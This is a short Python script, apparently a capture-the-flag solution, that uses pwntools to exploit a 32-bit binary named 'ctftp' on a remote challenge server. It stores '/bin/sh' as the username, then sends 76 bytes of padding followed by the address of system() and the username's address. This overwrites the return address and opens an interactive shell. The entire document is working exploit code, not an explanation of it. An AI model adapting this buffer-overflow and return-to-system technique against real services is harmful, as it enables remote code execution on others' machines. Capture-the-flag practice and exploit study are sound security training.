from pwn import *


e = ELF('ctftp')

# p = process('ctftp')
p = remote('chal.tuctf.com', 30500)

p.sendlineafter(': ', '/bin/sh')
p.sendlineafter('> ', '2')
p.sendlineafter(': ', 'A' * 76 + p32(e.plt['system']) + 'AAAA' + p32(e.symbols['username']))
p.interactive()